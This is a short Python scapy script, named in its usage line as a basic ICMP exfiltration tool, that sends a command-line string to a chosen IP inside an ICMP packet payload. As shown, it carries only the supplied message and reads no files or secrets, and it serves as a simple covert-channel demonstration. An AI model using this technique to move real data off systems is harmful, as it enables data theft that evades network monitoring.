#!/usr/bin/env python3
from scapy.all import IP, ICMP, send
import sys

def send_string_in_icmp(destination_ip, message):
    packet = IP(dst=destination_ip)/ICMP()/message
    send(packet, verbose=False, iface="enp0s3")
    print(f"Message '{message}' sent to {destination_ip} via ICMP packets.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 icmp_basic_exfiltr.py <destination_ip> <message>")
        sys.exit(1)
    
    destination_ip = sys.argv[1]
    message = sys.argv[2]
    send_string_in_icmp(destination_ip, message)

